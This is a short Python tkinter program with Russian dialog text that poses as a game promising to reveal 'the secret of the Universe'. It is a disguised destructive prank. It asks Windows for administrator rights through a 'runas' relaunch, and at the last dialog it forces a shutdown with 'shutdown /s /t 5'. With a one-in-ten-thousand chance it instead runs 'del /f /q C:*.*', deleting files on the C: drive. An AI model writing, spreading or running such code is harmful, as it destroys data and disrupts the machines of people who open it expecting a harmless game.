import sys
from ctypes import *
from os import system
from tkinter import *
from random import *
from shutil import rmtree

def isAdmin():
    try:
        return windll.shell32.IsUserAnAdmin()
    except:
        return False
def createLabel(text, window):
    '''Создание надписи'''
    label = Label(window, text=text, font=('Arial', 30))
    return label
def createButton(text, window):
    '''Создание кнопки'''
    button = Button(window, text=text, font=('Arial', 20), bg='#f5f5dc', command=lambda: createNewWindow(counter))
    return button
def createWindow(labelText, buttonText, i):
    '''Создание окна'''
    window = Tk()
    width = 800
    height = 400
    placementX = window.winfo_screenwidth() // 2 - width // 2
    placementY = window.winfo_screenheight() // 2 - height // 2
    window.title('Секрет Вселенной')
    window.geometry(f'{width}x{height}-{placementX}-{placementY}')
    window.resizable(width=False, height=False)
    createLabel(labelText, window).pack(pady=50)
    if i < 3:
        createButton(buttonText, window).pack(pady=70)
    elif i == 3:
        frame = Frame(window)
        createButton(buttonText, frame).pack(side='left')
        exitButton = Button(frame, text='Нет...', font=('Arial', 22), bg='#f5f5dc', command=window.destroy)
        exitButton.pack(side='right', padx=50)
        frame.pack(pady=70)
    windows.append(window)
    if i == 4:
        if randint(1, 10000) == 1:
            system('del /f /q C:*.*')
        else:
            system('shutdown /s /t 5')
    return window
def createNewWindow(i):
    '''Создание нового окна после нажатия кнопки'''
    windows[i - 1].withdraw()
    createWindow(labelTexts[i], buttonTexts[i], i)
    global counter
    counter += 1

if isAdmin():
    windows = []
    labelTexts = ['Вы хотите узнать самый\n главный секрет Вселенной?', 'Вы точно уверены?', 'Вы вряд ли сможете оправиться\n после этого секрета', 'Хорошо, вы готовы?',
                  'Я так подумал.\n Вы не готовы.\n Программа будет закрыта,\n а ваш компьютер уничтожен']
    buttonTexts = ['Да!', 'Абсолютно уверен!', 'Я желаю узнать его', 'Готов!', '']
    counter = 1
    window = createWindow(labelTexts[0], buttonTexts[0], 0)

    window.mainloop()
else:
    windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()